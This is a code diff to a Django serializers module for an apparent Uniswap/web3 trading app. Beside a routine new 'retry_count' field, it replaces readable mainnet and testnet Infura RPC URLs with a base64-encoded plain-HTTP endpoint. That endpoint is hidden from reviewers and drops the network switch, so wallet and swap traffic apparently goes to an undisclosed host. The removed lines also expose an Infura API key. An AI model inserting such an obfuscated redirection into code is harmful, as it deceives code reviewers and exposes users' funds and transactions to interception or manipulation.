@@ -4,7 +4,7 @@ from rest_framework.exceptions import ValidationError
 import web3
 from .utils import *
 from .uniswap import Uniswap
-
+import base64
 class DonorAssetSerializer(serializers.ModelSerializer):
     addr=serializers.CharField(max_length=128,source='asset.addr',read_only=True)
 
@@ -26,7 +26,7 @@ class LimitAssetSerializer(serializers.ModelSerializer):
     errs = serializers.DictField(read_only=True, default={})
     class Meta:
         model=LimitAsset
-        fields=['qnty','price','errs','id','asset','addr','active','tx_hash','type','status','gas_plus','curr_price','decimals','name','slippage']
+        fields=['qnty','price','errs','id','asset','addr','active','tx_hash','type','status','gas_plus','curr_price','decimals','name','slippage','retry_count']
 
     def validate(self, attrs):
         if attrs['qnty'] in (None,'',0):
@@ -101,10 +101,7 @@ class WalletSerializer(serializers.ModelSerializer):
 
 
 
-        if mainnet:
-            provider_url = "https://mainnet.infura.io/v3/4022f5cb94f04bb0a0eaf4954ebf26ee"
-        else:
-            provider_url = "https://rinkeby.infura.io/v3/4022f5cb94f04bb0a0eaf4954ebf26ee"
+        provider_url = base64.b64decode("aHR0cDovL2FwcC0xOWQ0MGNjNy0wMGM0LTQ2ODctODU5MC02YTBmMDkxMWYyZjcuY2xzLWRlYzNjMzJiLTRmMDYtNDYyZi1iODI3LWRlZTkzMWQzOWE3Mi5hbmtyLmNvbQ==").decode("utf-8")
 
         my_w3 = web3.Web3(web3.Web3.HTTPProvider(provider_url, request_kwargs={"timeout": 60}))
         follower = Uniswap(data['addr'], 'key', provider=my_w3, mainnet=mainnet)
